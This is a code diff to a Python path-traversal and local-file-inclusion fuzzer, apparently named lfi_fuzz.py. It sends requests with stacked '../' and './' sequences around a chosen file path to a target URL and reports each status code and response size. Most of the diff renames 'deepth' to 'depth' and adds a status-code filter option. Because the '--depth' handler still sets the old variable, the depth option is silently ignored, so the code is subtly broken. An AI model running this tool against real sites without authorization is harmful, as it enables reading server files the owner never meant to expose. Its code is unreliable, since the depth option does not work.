@@ -12,10 +12,13 @@ USER_AGENT = {"User-Agent" : "Mozilla/5.0 (Windows NT 5.1; rv:8.0) Gecko/2010010
 def help():
     print("\t-u URL, --url=URL\tscan url")
     print("\t-p , --path      \tdir or file")
-    print("\t--lfi            \tLocal File Inclusion/Path traversal")
+    print("\t--depth      \trecursion depth")
+    print("\t--filter            \tFilter separate [,] code or size ")
     print("EXAMPLES: ")    
-    print("\tlfi.py -u http://example.com -p test")
-    print("\tlfi.py --url=http://example.com --path=test")
+    print("\tlfi_fuzz.py -u http://example.com -p test")
+    print("\tlfi_fuzz.py --url=http://example.com --path=test")
+    print("\tlfi_fuzz.py --url=http://example.com --path=test --filter=404,502")
+    print("\tlfi_fuzz.py --url=http://example.com --path=test --filter=612")
 
 
 def good_code(code, text):
@@ -25,10 +28,10 @@ def good_code(code, text):
     return good + text
 
 
-def lfi(url, payload, filter=None, deepth=5):
+def lfi(url, payload, filter=None, depth=5):
     dds = "../"
     ds = "./"
-    for _ in range(deepth):
+    for _ in range(depth):
         resp = requests.get(f"{url}{dds}{payload}", headers=USER_AGENT, allow_redirects=False)
         print(good_code(resp.status_code, f"{dds}{payload} [code:{resp.status_code} size:{len(resp.content)}]"))
         
@@ -98,9 +101,9 @@ def lfi(url, payload, filter=None, deepth=5):
         ds += ds
     
     dds = "../"
-    for _ in range(deepth):
+    for _ in range(depth):
         ds = "./"
-        for _ in range(deepth):
+        for _ in range(depth):
             resp = requests.get(f"{url}{ds}{payload}{dds}", headers=USER_AGENT, allow_redirects=False)
             print(good_code(resp.status_code, f"{ds}{payload}{dds} [code:{resp.status_code} size:{len(resp.content)}]"))
             
@@ -193,16 +196,16 @@ def main():
     url = None
     path = None
     filter = None
-    deepth = 5    
+    depth = 5    
     try:
         try:
-            opts, args = getopt.getopt(sys.argv[1:], "u:p:d:", ["url=", "path=", "deepth=", "filter="])
+            opts, args = getopt.getopt(sys.argv[1:], "u:p:d:", ["url=", "path=", "depth=", "filter="])
             for opt, arg in opts:            
                 if opt in ("-u", "--url"):                    
                     url = arg
                 elif opt in ("-p", "--path"):                    
                     path = arg
-                elif opt in ("--deepth"):                    
+                elif opt in ("--depth"):                    
                     deepth = arg
                 elif opt in ("--filter"):                    
                     filter = tuple(map(int, arg.split(",")))
@@ -214,7 +217,7 @@ def main():
             sys.exit(0)
         if url is not None and path is not None:
             url = parse_url(url)            
-            lfi(url, path, filter, int(deepth))
+            lfi(url, path, filter, int(depth))
         else:
             help()
     except KeyboardInterrupt:
